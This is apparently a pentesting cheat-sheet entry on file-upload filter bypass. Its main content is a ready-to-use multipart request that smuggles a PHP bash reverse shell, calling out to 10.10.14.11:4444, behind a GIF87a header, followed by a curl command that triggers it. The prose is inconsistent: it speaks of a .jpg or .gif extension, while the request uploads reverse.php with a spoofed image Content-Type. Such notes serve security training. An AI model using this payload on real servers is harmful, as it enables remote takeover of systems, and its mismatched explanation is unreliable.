# File by pass

In some cases, the web application will only allow certain file extensions to be uploaded. However, the application may not check the file content, only the file extension. This can be exploited by uploading a file with a valid extension, but with a different file type. For example, a PHP file can be uploaded with a `.jpg` extension. This can be used to execute code on the server.

## Example

```bash
------WebKitFormBoundaryBqdknE02TXAj3VxC
Content-Disposition: form-data; name="file"; filename="reverse.php"
Content-Type: image/gif

GIF87a;<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'");
?>

------WebKitFormBoundaryBqdknE02TXAj3VxC
Content-Disposition: form-data; name="submit"

Submit Screenshot
------WebKitFormBoundaryBqdknE02TXAj3VxC--
```

`GIF87a;` is the header of a GIF file.
`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP> 0>&1'"); ?>` is the PHP code that will be executed on the server.

Here, a PHP file is uploaded with a `.gif` extension. When the server processes the file, it will execute the PHP code and create a reverse shell.

Then when we access this image, the server will execute the PHP code and create a reverse shell from the listener we have set up.

```bash
curl http://<IP>/uploads/reverse.php
```

## Links

- https://book.hacktricks.xyz/pentesting-web/file-upload